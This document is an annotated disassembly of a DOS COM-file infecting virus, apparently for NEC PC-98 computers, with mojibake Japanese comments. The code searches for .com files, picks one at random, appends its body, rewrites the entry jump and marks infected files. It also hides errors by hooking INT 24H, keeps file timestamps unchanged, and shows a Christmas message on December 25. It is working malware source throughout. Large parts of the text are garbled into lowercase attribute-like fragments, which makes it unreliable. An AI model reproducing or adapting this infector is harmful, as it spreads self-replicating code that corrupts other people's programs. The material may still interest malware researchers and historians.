﻿

;-------------------------------------------------------
;	‚c‚`‚‚|‚Q
;-------------------------------------------------------
;
;	ƒIƒŠƒWƒiƒ‹ƒvƒƒOƒ‰ƒ€æ“ª
;P_TOP:	JMP	P_00000					;E9 XX XX	...
;	iƒIƒŠƒWƒiƒ‹ƒvƒƒOƒ‰ƒ€•”•ªÈ—ªj


;	ƒEƒCƒ‹ƒXƒGƒ“ƒgƒŠ[ˆÊ’u	(P_00000:Virus_Top)
;
;------------------------------------------------------------------------------
;	ƒEƒCƒ‹ƒXæ“ªƒAƒhƒŒƒXŽæ“¾EŠ´õƒtƒ@ƒCƒ‹æ“ª‚Ì‚SƒoƒCƒg•œ‹Œ
;------------------------------------------------------------------------------
P_00000:MOV    BL,001H 	;Š´õŽ¯•Êƒf[ƒ^(01H)            ;B3 01 	..
	CALL   NEAR PTR P_00005                         ;E8 00 00 	...
P_00005:POP    DI                                       ;5F 	_
	SUB    DI,00005H ;DI=³²Ù½Ä¯Ìß(P_00000)µÌ¾¯Ä±ÄÞÚ½;83 EF 05 	...
	MOV    BP,DI                                    ;8B EF 	..
	ADD    BP,00358H ;BP=Ü°¸´Ø±‚ÌƒgƒbƒvƒAƒhƒŒƒX     ;81 C5 58 03 	..X.
	MOV    [BP+00406H],DI	;³²Ù½Ä¯ÌßµÌ¾¯Ä±ÄÞÚ½•Û‘¶	;89 BE 06 04 	....
	JNE    P_00019          ;P_00019‚ÖiJNE‚Í³²Ù½ì¬’†‚Ì­Õj;75 04 u.
;---------------------------------
D_00015:MOV    AX,CS  	;ƒIƒŠƒWƒiƒ‹ƒf[ƒ^ µÌ¾¯Ä(P_TOP:)	;8C C8 	..
D_00017:MOV    DS,AX    ;                 µÌ¾¯Ä(P_TOP:)+2;8E D8 	..
;---------------------------------
P_00019:PUSH   DI               			;57 	W
	MOV    DI,00100H       				;BF 00 01 	...
	MOV    SI,[BP+00406H]   ;=³²Ù½Ä¯Ìß±ÄÞÚ½         ;8B B6 06 04 	....
	ADD    SI,00015H        ;D_00015/D_00017        ;83 C6 15 	...
	MOV    CX,00002H        ;Š´õŽž‚É•ÏX‚µ‚½COMÌ§²Ù;B9 02 00 	...
	CLD                     ;‚Ìæ“ª‚SƒoƒCƒg‚ðC•œ   ;FC 	.
	REPZ                                            ;F3 	.
	MOVSW                                           ;A5 	.
	POP    DI                                       ;5F 	_
;------------------------------------------------------------------------------
;	”­•a‚Ì”»’fEŠ´õˆ—‚Ö‚Ì•ªŠò
;------------------------------------------------------------------------------
	MOV    AH,02CH       	;Žž‚ÌŽæ“¾             ;B4 2C 	.,
	INT    21H                                      ;CD 21 	.!
	ADD    DX,BP                                    ;03 D5 	..
	MOV    [BP+00400H],DH   ;DH=i•bj—”‚ÉŽg—p    ;88 B6 00 04 	....
	MOV    AL,000H          ;Š´õ¢‘ã¶³ÝÀ(Œ¸ŽZ)	;B0 00 	..
;
;<à–¾>	‚±‚Ì¢MOV AL,000H£–½—ß‚Ì¢000H£‚Ìƒf[ƒ^‚Íu”­•a‚ð‹ÖŽ~E‹–‰Âv‚·‚é
;	‚PƒoƒCƒg‚Ìƒtƒ‰ƒOiŠ´õ¢‘ã‚ðŽ¦‚·ƒJƒEƒ“ƒ^j‚ÅA¢000H£‚É’B‚·‚é‚Ü‚Å
;	‚ÌŠÔ‚ÍAŽ©•ª‚ÌƒJƒEƒ“ƒ^‚ðƒfƒNƒŠƒƒ“ƒg¢-1£‚µ‚½ƒEƒCƒ‹ƒX‚ðŠ´õ‚·‚éB
;	ˆÈ‰º‚ÌƒvƒƒZƒX‚ÍAƒEƒCƒ‹ƒXìŽÒ‚ªÝ’è‚µ‚½’l‚æ‚è¢00H£‚É’B‚·‚é‚Ü‚Å‚ÌŠÔA
;	i¢0XXH£`¢001H£‚Ü‚ÅjŠ´õƒtƒ@ƒCƒ‹‚Íu‚P‚QŒŽ‚Q‚T“ú‚Å‚à”­•a‚ð‹ÖŽ~v
;	‚µAŠ´õˆ—‚ðê–å‚És‚¤—lÝŒv‚³‚ê‚Ä‚¢‚éB
;
	AND    AL,AL            ;Š´õ¢‘ã¶³ÝÀ(Œ¸ŽZ)‚ª0ˆÈŠO_	;22 C0 	".
	JNE    P_0004E          ;‚Í”­•a‹ÖŽ~(Š´õˆ—‚Ö)		;75 13 	u.
	MOV    AH,02AH          ;“ú•t‚ÌŽæ“¾             ;B4 2A 	.*
	INT    21H                                      ;CD 21 	.!
	CMP    DH,00CH          ;¡“ú‚Í‚P‚QŒŽ‚©H       ;80 FE 0C 	...
	JNE    P_0004E          ;No.Š´õˆ—‚Ö		;75 0A 	u.
	ADD    DH,DH            ;DH=00CH*2=018H         ;02 F6 	..
	INC    DH               ;DH=019H=25             ;FE C6 	..
	CMP    DL,DH            ;¡“ú‚Í(12ŒŽ)‚Q‚T“ú‚©H ;3A D6 	:.
	JNE    P_0004E          ;No.Š´õˆ—‚Ö          ;75 02 	u.
	JMP    SHORT P_00051    ;Yes.”­•aˆ—‚Ö         ;EB 03 	..
P_0004E:JMP    NEAR PTR P_000D5 ;ƒŠ´õˆ—‚Ö„         ;E9 84 00 	...
;------------------------------------------------------------------------------
;	P_00051	”­•aˆ—@Š´õ¢‘ã¶³ÝÀ‚ª¢000H£‚©‚Â‚P‚QŒŽ‚Q‚T“ú‚É”­•a
;------------------------------------------------------------------------------
;
;<‰ðà>	‰æ–Êã‚É'A merry christmas to you!'‚ðiF‚ð•Ï‚¦‚È‚ª‚çj•\Ž¦‚·‚éB
;	ij‚É‚Â‚¢‚Ä‚ÍANEC-PCŒnƒGƒXƒP[ƒvƒV[ƒPƒ“ƒX‚ðŽg—p‚µ‚Ä‚¢‚éB
;
P_00051:MOV    SI,000CBH       	;”­•a•¶Žš—ñD_000CBHÃÞ°ÀˆÊ’u;BE CB 00 	...
	ADD    SI,DI            ;ŽÀÛ‚Ì±ÄÞÚ½‚ÉŠ·ŽZ  	;03 F7 	..
	CALL   NEAR PTR P_00242 ;ˆÃ†‰ðœE•¶Žš—ñ‚Ì•\Ž¦	;E8 E9 01 	...
P_00059:MOV    SI,000AAH        ;•\Ž¦FD_000AAÃÞ°ÀˆÊ’u  ;BE AA 00 	...
	ADD    SI,DI            ;ŽÀÛ‚Ì±ÄÞÚ½‚ÉŠ·ŽZ	;03 F7 	..
	MOV    AL,[SI]          			;8A 04 	..
	XOR    AL,0FEH          ;FÃÞ°À‚ÌˆÃ†‰ðœ       ;34 FE 	4.
	INC    AL               ;FÃÞ°À‚Ì•ÏX(+1)       ;FE C0 	..
	XOR    AL,0FEH          ;•ÏX‚µ‚½FÃÞ°À‚ÉˆÃ†‚ðŠ|‚¯‚ÄA;34 FE 	4.
	MOV    [SI],AL          ;•\Ž¦—p‚ÌˆÃ†•¶Žš—ñ‚É¾¯Ä;88 04 	..
	XOR    AL,0FEH          ;Ä“x@ˆÃ†‰ðœ         ;34 FE 	4.
	CMP    AL,037H          ;FÃÞ°À‚Íu”’Fv‚©H   ;3C 37 	<7 jnle="" p_0008d="" ;u”’fv‚è‚ç‚î•\ž¦i—¹="" ;7f="" 1f="" ..="" mov="" si,00098h="" ;'a="" mer..'”­•a•¶žš—ñãþ°àˆê’u;be="" 98="" 00="" ...="" add="" si,di="" ;žàû‚ì±äþú½‚éš·žz="" ;03="" f7="" ..="" call="" near="" ptr="" p_00242="" ;ˆã†‰ðœe•¶žš—ñ‚ì•\ž¦="" ;e8="" cc="" 01="" ...="" mov="" al,019h="" ;•\ž¦žž‚ìƒeƒgƒcƒgƒ‹[ƒ`ƒ“;b0="" 19="" ..="" p_00078:mov="" cx,0ea60h="" ;b9="" 60="" ea="" .`.="" p_0007b:nop="" ;90="" .="" nop="" ;90="" .="" nop="" ;90="" .="" nop="" ;90="" .="" nop="" ;90="" .="" nop="" ;90="" .="" nop="" ;90="" .="" nop="" ;90="" .="" nop="" ;90="" .="" nop="" ;90="" .="" loop="" p_0007b="" ;ižžšô‰ò‚¬j="" ;e2="" f4="" ..="" dec="" al="" ;fe="" c8="" ..="" jne="" p_00078="" ;75="" ed="" u.="" jmp="" short="" p_00059="" ;•ê‚ìf‚å•¶žš—ñ‚ð•\ž¦‚·‚é;eb="" cc="" ..="" p_0008d:mov="" si,000cbh="" ;´½¹°ìß¼°¹ý½‰šú’lãþ°àˆê’u;be="" cb="" 00="" ...="" add="" si,di="" ;žàû‚ì±äþú½ˆê’u‚éš·žz="" ;03="" f7="" ..="" call="" near="" ptr="" p_00242="" ;i‰æ–ê‚ìá‹ž‚è‚çj="" ;e8="" ad="" 01="" ...="" jmp="" near="" ptr="" p_0023c="" ;³²ù½i—¹ˆ—(±ìßø¹°¼®ý•œ‹a);e9="" a4="" 01="" ...="" ;------------------------------------------------------------------------------="" d_00098:db="" 0e5h=""></7><ˆã†‰»>”­•a•\Ž¦•¶Žš—ñ              ;E5 	.
	DB	0A5H    ;ˆÃ†‰ðœŒã                          ;A5 	.
	DB	0C0H    ;01BH,'[>5h',01BH,'[12;27H',01BH,'[5;3';C0 	.
	DB	0CBH                                         ;CB 	.
	DB	096H                                         ;96 	.
	DB	0E5H                                         ;E5 	.
	DB	0A5H                                         ;A5 	.
	DB	0CFH                                         ;CF 	.
	DB	0CCH                                         ;CC 	.
	DB	0C5H                                         ;C5 	.
	DB	0CCH                                         ;CC 	.
	DB	0C9H                                         ;C9 	.
	DB	0B6H                                         ;B6 	.
	DB	0E5H                                         ;E5 	.
	DB	0A5H                                         ;A5 	.
	DB	0CBH                                         ;CB 	.
	DB	0C5H                                         ;C5 	.
D_000AA:DB	0CDH   	;(ÃÞ°À‚ÍD_00098‚æ‚èŒp‘±)	     ;CD 	.
	DB	0CFH    ;ˆÃ†‰ðœŒã                          ;CF 	.
	DB	093H    ;'1','m',                            ;93 	.
	DB	0BFH    ;'A merry christmas to you!','[m',00H;BF 	.
	DB	0DEH                                         ;DE 	.
	DB	093H                                         ;93 	.
	DB	09BH                                         ;9B 	.
	DB	08CH                                         ;8C 	.
	DB	08CH                                         ;8C 	.
	DB	087H                                         ;87 	.
	DB	0DEH                                         ;DE 	.
	DB	09DH                                         ;9D 	.
	DB	096H                                         ;96 	.
	DB	08CH                                         ;8C 	.
	DB	097H                                         ;97 	.
	DB	08DH                                         ;8D 	.
	DB	08AH                                         ;8A 	.
	DB	093H                                         ;93 	.
	DB	09FH                                         ;9F 	.
	DB	08DH                                         ;8D 	.
	DB	0DEH                                         ;DE 	.
	DB	08AH                                         ;8A 	.
	DB	091H                                         ;91 	.
	DB	0DEH                                         ;DE 	.
	DB	087H                                         ;87 	.
	DB	091H                                         ;91 	.
	DB	08BH                                         ;8B 	.
	DB	0DFH                                         ;DF 	.
	DB	0F3H                                         ;F3 	.
	DB	0F4H                                         ;F4 	.
	DB	0E5H                                         ;E5 	.
	DB	0A5H                                         ;A5 	.
	DB	093H                                         ;93 	.
	DB	0FEH                                         ;FE 	.
;---------------------------------
D_000CC:DB	0E5H ;<ˆã†‰»>”­•a—p•\Ž¦•¶Žš—ñ		     ;E5 	.
	DB	0A5H ;ˆÃ†‰ðœŒã                             ;A5 	.
	DB	0C0H ;01BH,'[>5l',01BH,'[2J',000H            ;C0 	.
	DB	0CBH                                         ;CB 	.
	DB	092H                                         ;92 	.
	DB	0E5H                                         ;E5 	.
	DB	0A5H                                         ;A5 	.
	DB	0CCH                                         ;CC 	.
	DB	0B4H                                         ;B4 	.
	DB	0FEH                                         ;FE 	.
;------------------------------------------------------------------------------
;	P_000D5	Š´õˆ—@ƒGƒ“ƒgƒŠ[ˆÊ’u@iŠ´õ¢‘ãƒJƒEƒ“ƒ^‚ÌƒfƒNƒŠƒƒ“ƒgj
;------------------------------------------------------------------------------
P_000D5:MOV    BX,00035H        ;Š´õ¢‘ã¶³ÝÀƒ`ƒFƒbƒN   ;BB 35 00 	.5.
	ADD    BX,DI                                    ;03 DF 	..
	MOV    AX,[BX]                                  ;8B 07 	..
	AND    AH,AH            ;ƒJƒEƒ“ƒ^‚OH         ;22 E4 	".
	JE     P_000E2          ;‚·‚Å‚É‚O‚Å‚ ‚ê‚Î‚»‚Ì‚Ü‚Ü;74 02 	t.
	DEC    AH               ;ƒJƒEƒ“ƒ^‚ðu-1v‚·‚é   ;FE CC 	..
;------------------------------------------------------------------------------
;	P_000E2	ƒJƒŒƒ“ƒgƒfƒBƒŒƒNƒgƒŠ‚Ì‚b‚n‚lƒtƒ@ƒCƒ‹‚ðŒŸõ
;------------------------------------------------------------------------------
P_000E2:MOV    [BX],AX                                  ;89 07 	..
	MOV    AH,01AH                                  ;B4 1A 	..
	MOV    DX,BP                                    ;8B D5 	..
	INT    21H              ;‚c‚s‚`—ÌˆæŠm•Û         ;CD 21 	.!
	MOV    AH,04EH                                  ;B4 4E 	.N
	MOV    CX,00020H                                ;B9 20 00 	. .
	MOV    DX,00110H        ;ŒŸõÌ§²ÙÊß½'*.com',00H ;BA 10 01 	...
	ADD    DX,DI            ;ŽÀÛ‚Ì±ÄÞÚ½‚ÉŠ·ŽZ	;03 D7 	..
	INT    21H              ;Å‰‚Éˆê’v‚·‚éÌ§²ÙŒŸõ ;CD 21 	.!
	MOV    CL,[BP+00400H]   ;—”Žæ“¾@‚O`‚T‚X     ;8A 8E 00 04 	....
	AND    CL,007H          ;—”CL@‚O`‚V       ;80 E1 07 	...
	INC    CL               ;—”CL@‚P`‚W       ;FE C1 	..
P_000FF:CMP    AL,012H                                  ;3C 12 	<. jne="" p_00106="" ;išy“–ì§²ù‚ ‚èj="" ;75="" 03="" u.="" jmp="" near="" ptr="" p_0023c="" ;išy“–ì§²ù‚è‚µ¥i—¹j="" ;e9="" 36="" 01="" .6.="" p_00106:dec="" cl="" ;—”‚ðãþ¶³ýä(-1)="" ;fe="" c9="" ..="" je="" p_00116="" ;—”‚ª‚o‚é‚è‚éžž‚ìšy“–ì§²ù‚éš´õ;74="" 0c="" t.="" mov="" ah,04fh="" ;žÿ‚éˆê’v‚·‚éì§²ùœÿõ="" ;b4="" 4f="" .o="" int="" 21h="" ;cd="" 21="" .!="" jmp="" short="" p_000ff="" ;eb="" ef="" ..="" ;---------------------------------="" d_00110:db="" 02ah="" ;å‰‚éˆê’v‚·‚éì§²ùœÿõ—p@êß½•¶žš—ñ="" ;2a="" *="" db="" 02eh="" ;'*.com',00h="" ;2e="" .="" db="" 063h="" ;63="" c="" db="" 06fh="" ;6f="" o="" db="" 06dh="" ;6d="" m="" db="" 000h="" ;00="" .="" ;------------------------------------------------------------------------------="" ;="" p_00116="" ‚c‚s‚`ƒaƒhƒœƒx•ïxecomƒtƒ@ƒcƒ‹“çž="" ;------------------------------------------------------------------------------="" p_00116:mov="" si,bp="" ;‚c‚s‚`="" ;8b="" f5="" ..="" add="" si,0001eh="" ;œÿõ‚³‚ê‚½ì§²ù–¼‚ì±äþú½;83="" c6="" 1e="" ...="" mov="" ax,03d00h="" ;b8="" 00="" 3d="" ..="MOV" dx,bp="" ;8b="" d5="" ..="" add="" dx,0001eh="" ;(r:ø°äþó°äþ)="" ;83="" c2="" 1e="" ...="" int="" 21h="" ;‚c‚s‚`‚é‚æ‚éì§²ùµ°ìßý="" ;cd="" 21="" .!="" jnb="" p_0012a="" ;(µ°ìßý¬œ÷)="" ;73="" 03="" s.="" jmp="" near="" ptr="" p_0023c="" ;ž¸”s="" ;e9="" 12="" 01="" ...="" p_0012a:mov="" bx,ax="" ;ƒnƒ“ƒhƒ‹”ô†="" ;8b="" d8="" ..="" mov="" ax,05700h="" ;b8="" 00="" 57="" ..w="" int="" 21h="" ;ì§²ùà²ñ½àýìßžæ“¾="" ;cd="" 21="" .!="" mov="" [bp+00408h],cx="" ;žž:à²ñ½àýìß•û‘¶="" ;89="" 8e="" 08="" 04="" ....="" mov="" [bp+0040ah],dx="" ;“ú•t="" ;89="" 96="" 0a="" 04="" ....="" mov="" ah,03fh="" ;b4="" 3f="" .?="" mov="" cx,07800h="" ;b9="" 00="" 78="" ..x="" mov="" dx,bp="" ;(ds:dx="Ø°ÄÞÊÞ¯Ì§)" ;8b="" d5="" ..="" add="" dx,00500h="" ;æ“ª‚©‚ç07800hêþ²ä="" ;81="" c2="" 00="" 05="" ....="" int="" 21h="" ;ƒtƒ@ƒcƒ‹ƒš[ƒh="" ;cd="" 21="" .!="" mov="" [bp+00404h],ax="" ;ax="ŽÀÛ‚Ì“ÇžƒTƒCƒY" ;89="" 86="" 04="" 04="" ....="" mov="" ah,03eh="" ;b4="" 3e="" .="">
	INT    21H              ;Ì§²Ù¸Û°½Þ	        ;CD 21 	.!
;------------------------------------------------------------------------------
;	d•¡Š´õ‚ð–hŽ~‚·‚éƒ`ƒFƒbƒNi³²Ù½µÌ¾¯Ä01H‚Ì1ÊÞ²Ä¢01H£‚É‚æ‚éj
;------------------------------------------------------------------------------
;
;<‰ðà>	“ÇžCOMƒtƒ@ƒCƒ‹‚Ìæ“ª‚ª	
;	¢E9H£‚i‚l‚o–½—ß‚Å‚È‚¢ê‡–¢Š´õ‚Æ”»’fiŠ´õ‚·‚éj
;	¢E9H£‚Å‚ ‚Á‚ÄA	”òæ+01H‚ÌƒR[ƒh‚ª¢01H£Š´õÏiŠ´õ‚ð’†Ž~j
;			”òæ+01H‚ÌƒR[ƒh‚ª¢01H£‚Å‚Í‚È‚¢–¢Š´õ‚Æ”»’f
;							iŠ´õ‚·‚éj
;
	MOV    SI,BP                                    ;8B F5 	..
	ADD    SI,00500H      	;iØ°ÄÞÊÞ¯Ì§æ“ªj      ;81 C6 00 05 	....
	CMP    Byte Ptr [SI],0E9H;æ“ª–½—ß‚ÍJMP(0E9H)‚©H;80 3C E9 	.<. jne="" p_0016b="" ;no.–¢š´õ‚æ”»’feš´õ‚ö="" ;75="" 12="" u.="" inc="" si="" ;yes.="" ;46="" f="" mov="" ax,[si]="" ;8b="" 04="" ..="" add="" si,00002h="" ;83="" c6="" 02="" ...="" add="" si,ax="" ;ƒwƒƒƒ“ƒvæˆê’u‚ð‹‚ß‚é="" ;03="" f0="" ..="" mov="" ax,[si]="" ;8b="" 04="" ..="" cmp="" ah,001h="" ;š´õž¯•êƒr[ƒhšm”f="" ;80="" fc="" 01="" ...="" jne="" p_0016b="" ;no.–¢š´õ‚æ”»’feš´õ‚ö;75="" 03="" u.="" jmp="" near="" ptr="" p_0023c="" ;yes.š´õï‚æ”»’f¥i—¹‚ö;e9="" d1="" 00="" ...="" ;------------------------------------------------------------------------------="" ;="" p_0016b="" ƒƒ‚ƒš[(êþ¯ì§)ã‚åƒeƒcƒ‹ƒxžæ•t¥æ“ª‚sƒoƒcƒg‘š·="" ;------------------------------------------------------------------------------="" p_0016b:mov="" di,bp="" ;8b="" fd="" ..="" add="" di,00500h="" ;81="" c7="" 00="" 05="" ....="" add="" di,[bp+00404h]="" ;“çžì§²ù‚ìi’[ˆê’u="" ;03="" be="" 04="" 04="" ....="" mov="" si,[bp+00406h]="" ;³²ù½ž©g‚ìæ“ªˆê’u(p_00000);8b="" b6="" 06="" 04="" ....="" mov="" cx,00258h="" ;b9="" 58="" 02="" .x.="" nop="" ;90="" .="" repz="" ;f3="" .="" movsb="" ;³²ù½º°äþ‚ðêþ¯ì§ã‚åžæ‚è•t‚¯‚é;a4="" .="" mov="" si,bp="" ;8b="" f5="" ..="" add="" si,00500h="" ;81="" c6="" 00="" 05="" ....="" mov="" di,si="" ;8b="" fe="" ..="" add="" di,[bp+00404h]="" ;03="" be="" 04="" 04="" ....="" add="" di,00015h="" ;83="" c7="" 15="" ...="" mov="" cx,00002h="" ;b9="" 02="" 00="" ...="" repz="" ;f3="" .="" movsw="" ;êþ¯ì§“à‚ìæ“ª4êþ²ä‚ð•û‘¶;a5="" .="" mov="" di,bp="" ;8b="" fd="" ..="" add="" di,00500h="" ;81="" c7="" 00="" 05="" ....="" mov="" byte="" ptr="" [di],0e9h;æ“ª‚ðjmp–½—ß‚é‘š·="" ;c6="" 05="" e9="" ...="" inc="" di="" ;47="" g="" mov="" ax,[bp+00404h]="" ;8b="" 86="" 04="" 04="" ....="" sub="" ax,00003h="" ;2d="" 03="" 00="" -..="" mov="" [di],ax="" ;¼þ¬ýìß±äþú½‚ðjmpº°äþ‚å‘ž‚þ;89="" 05="" ..="" mov="" di,bp="" ;8b="" fd="" ..="" add="" di,00758h="" ;(d_00256)±äþú½‚é‘š“–="" ;81="" c7="" 58="" 07="" ..x.="" add="" di,[bp+00404h]="" ;03="" be="" 04="" 04="" ....="" mov="" ax,[bp+00404h]="" ;8b="" 86="" 04="" 04="" ....="" add="" ax,00258h="" ;05="" 58="" 02="" .x.="" nop="" ;90="" .="" neg="" ax="" ;f7="" d8="" ..="" sub="" di,00002h="" ;83="" ef="" 02="" ...="" mov="" [di],ax="" ;³²ù½‚©‚çµø¼þåùæ“ª‚é–ß‚éˆê’u¾¯ä;89="" 05="" ..="" ;------------------------------------------------------------------------------="" ;="" ‚h‚m‚s‚q‚s‚g’v–½“iƒgƒ‰[š„‚èž‚ý‚ì–³œø‰»="" ;------------------------------------------------------------------------------="" cli="" ;fa="" .="" mov="" di,[bp+00406h]="" ;8b="" be="" 06="" 04="" ....="" xor="" ax,ax="" ;‚h‚m‚s‚q‚s‚gƒxƒnƒ^žæ“¾="" ;33="" c0="" 3.="" mov="" es,ax="" ;8e="" c0="" ..="" mov="" bx,00090h="" ;bb="" 90="" 00="" ...="" mov="" ax,es:[bx]="" ;‚h‚m‚s‚q‚s‚gƒxƒnƒ^•û‘¶="" ;26="" 8b="" 07="" &..="" mov="" [di+00251h],ax="" ;89="" 85="" 51="" 02="" ..q.="" mov="" ax,es:[bx+2]="" ;26="" 8b="" 47="" 02="" &.g.="" mov="" [di+00253h],ax="" ;89="" 85="" 53="" 02="" ..s.="" mov="" ax,0023fh="" ;‚h‚m‚s‚q‚s‚gƒxƒnƒ^‘š·="" ;b8="" 3f="" 02="" .?.="" add="" ax,di="" ;(’v–½“iƒgƒ‰[‚ì–³œø‰»)="" ;03="" c7="" ..="" mov="" es:[bx],ax="" ;26="" 89="" 07="" &..="" mov="" ax,cs="" ;8c="" c8="" ..="" mov="" es:[bx+2],ax="" ;26="" 89="" 47="" 02="" &.g.="" sti="" ;fb="" .="" ;------------------------------------------------------------------------------="" ;="" ƒoƒbƒtƒ@[ã‚ìuƒeƒcƒ‹ƒx•t‚«ƒvƒƒoƒ‰ƒ€v‚ð‘‚«ž‚ý="" ;------------------------------------------------------------------------------="" mov="" ax,03c01h="" ;b8="" 01="" 3c=""></.>< mov="" dx,bp="" ;8b="" d5="" ..="" add="" dx,0001eh="" ;(ds:dx="ÊÞ¯Ì§)(W:×²ÄÓ°ÄÞ);83" c2="" 1e="" ...="" int="" 21h="" ;‚c‚s‚`‚é‚æ‚éì§²ùµ°ìßý="" ;cd="" 21="" .!="" mov="" bx,ax="" ;ƒnƒ“ƒhƒ‹”ô†="" ;8b="" d8="" ..="" jb="" p_00218="" ;(ž¸”s)="" ;72="" 21="" r!="" push="" bx="" ;53="" s="" mov="" ah,040h="" ;b4="" 40="" .@="" mov="" cx,[bp+00404h]="" ;8b="" 8e="" 04="" 04="" ....="" add="" cx,00258h="" ;81="" c1="" 58="" 02="" ..x.="" mov="" dx,bp="" ;8b="" d5="" ..="" add="" dx,00500h="" ;(š´õ‚µ‚½ì§²ù‚é‘š·)="" ;81="" c2="" 00="" 05="" ....="" int="" 21h="" ;ƒ‰ƒcƒgƒnƒ“ƒhƒ‹="" ;cd="" 21="" .!="" pop="" bx="" ;5b="" [="" mov="" ax,05701h="" ;b8="" 01="" 57="" ..w="" mov="" cx,[bp+00408h]="" ;•û‘¶à²ñ½àýìß="" ;8b="" 8e="" 08="" 04="" ....="" mov="" dx,[bp+0040ah]="" ;8b="" 96="" 0a="" 04="" ....="" int="" 21h="" ;ì§²ùà²ñ½àýìßý’èi•œœ³j;cd="" 21="" .!="" p_00218:mov="" ah,03eh="" ;b4="" 3e="" .="">
	INT    21H            	;ƒtƒ@ƒCƒ‹ƒNƒ[ƒY       ;CD 21 	.!
;------------------------------------------------------------------------------
;	‚h‚m‚s‚Q‚S‚g’v–½“IƒGƒ‰[Š„‚èž‚Ý‚Ì•œ‹Œ
;------------------------------------------------------------------------------
	CLI                                             ;FA 	.
	MOV    DI,[BP+00406H]                           ;8B BE 06 04 	....
	XOR    AX,AX            ;‚h‚m‚s‚Q‚S‚gƒxƒNƒ^•œ‹Œ ;33 C0 	3.
	MOV    ES,AX                                    ;8E C0 	..
	MOV    BX,00090H                                ;BB 90 00 	...
	MOV    AX,[DI+00251H]                           ;8B 85 51 02 	..Q.
	MOV    ES:[BX],AX                               ;26 89 07 	&..
	MOV    AX,[DI+00253H]                           ;8B 85 53 02 	..S.
	MOV    ES:[BX+2],AX                             ;26 89 47 02 	&.G.
	MOV    AX,CS                                    ;8C C8 	..
	MOV    ES,AX                                    ;8E C0 	..
	STI                     ;(ÊÞ¸Þ:DTA±ÄÞÚ½‚ª•œ‹Œ‚³‚ê‚Ä‚¢‚È‚¢);FB 	.
P_0023C:JMP    SHORT B_00255  	;JMP 0100H‚Ö            ;EB 17 	..
	NOP                                             ;90 	.
;------------------------------------------------------------------------------
;	INT_24H	‘žˆ—’†‚Ì‚h‚m‚s‚Q‚S‚gŠ„žˆ—
;------------------------------------------------------------------------------
INT_24H:XOR    AH,AH   	;‚h‚m‚s‚Q‚S‚gˆ—@ƒƒbƒZ[ƒWo‚³‚¸‹A‚·	;32 E4 	2.
	IRET            ;i’v–½“IƒGƒ‰[Š„žj        		;CF 	.
;------------------------------------------------------------------------------
;	P_00242	”­•aŽž‚ÌuˆÃ†•¶Žš‰ðœv{u•¶Žš—ñ•\Ž¦ƒ‹[ƒ`ƒ“v
;------------------------------------------------------------------------------
P_00242:MOV    DL,[SI]  ;ƒf[ƒ^‚Ì±ÄÞÚ½‚©‚ç‚P•¶ŽšŽæ“¾    ;8A 14 	..
	INC    SI                                       ;46 	F
	XOR    DL,0FEH 	;•¶Žš—ñ‚ÌˆÃ†‚ð‰ðœ             ;80 F2 FE 	...
	JE     P_00250  ;(•\Ž¦•¶Žš—ñ‚ÌI‚í‚è DL=000H)   ;74 06 	t.
	MOV    AH,006H                                  ;B4 06 	..
	INT    21H     	;^C‚ðŽó‚¯•t‚¯‚È‚¢‚P•¶Žš(DL)•\Ž¦ ;CD 21 	.!
	JMP    SHORT P_00242                            ;EB F2 	..
P_00250:RETN         	                                ;C3 	.
;---------------------------------
D_00251:DW	004DAH        	;INT24HÍÞ¸À±ÄÞÚ½•Û‘¶ˆÊ’u;DA 04 	..
D_00253:DW	00DC3H                                  ;C3 0D 	..
;------------------------------------------------------------------------------
;	D_00255	ƒEƒCƒ‹ƒXˆ—I—¹Š´õƒAƒvƒŠƒP[ƒVƒ‡ƒ“‚Ìæ“ª‚Ö
;------------------------------------------------------------------------------
B_00255:DB	0E9H         	;JMP	0100H           	;E9 	.
D_00256:DW	0F1F0H          ;ƒIƒŠƒWƒiƒ‹ƒtƒ@ƒCƒ‹‚Ìæ“ª‚Ö  	;F0 F1 	..
;------------------------------------------------------------------------------

</‰ðà></.></ˆã†‰»></ˆã†‰»></‰ðà></à–¾>